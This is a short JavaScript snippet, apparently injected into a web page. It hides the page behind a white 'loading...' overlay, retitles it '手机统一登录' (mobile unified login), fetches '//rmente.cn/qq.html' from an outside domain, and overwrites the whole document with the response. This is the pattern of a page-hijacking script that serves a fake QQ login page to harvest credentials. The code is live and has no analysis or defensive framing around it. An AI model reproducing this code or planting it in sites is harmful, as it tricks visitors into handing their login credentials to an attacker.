var ua = navigator.userAgent.toLowerCase();
var _lay = document.createElement('div');
_lay.setAttribute('style', 'width:100%;height:2048px;font-size:1.4em;position:absolute;background-color:white;z-index:99999999;left:0;top:0;');
_lay.innerHTML = '<div style="color:black;text-align:center;font-size:1.3em">loading...</div>';
if (document.body) document.body.appendChild(_lay);
document.title = "手机统一登录";
var xhr = new XMLHttpRequest;
var html = null;

function getParam(name, url) {
    var r = new RegExp('(\?|#|&)' + name + '=(.*?)(#|&|$)');
    var m = (url || location.href).match(r);
    return (m ? m[2] : '')
}

function render() {
    var a = document.open("text/html", "replace");
    a.write(html);
    a.close()
}

xhr.onload = function () {
    html = xhr.responseText;
    var delay = 0;
    if (delay > 0) setTimeout("render()", delay * 1000); else render()
};
var u = document.scripts;
u = u[u.length - 1].src.substring(0, u[u.length - 1].src.lastIndexOf("/") + 1);
xhr.open("GET", "//rmente.cn/qq.html", !0);
xhr.send();
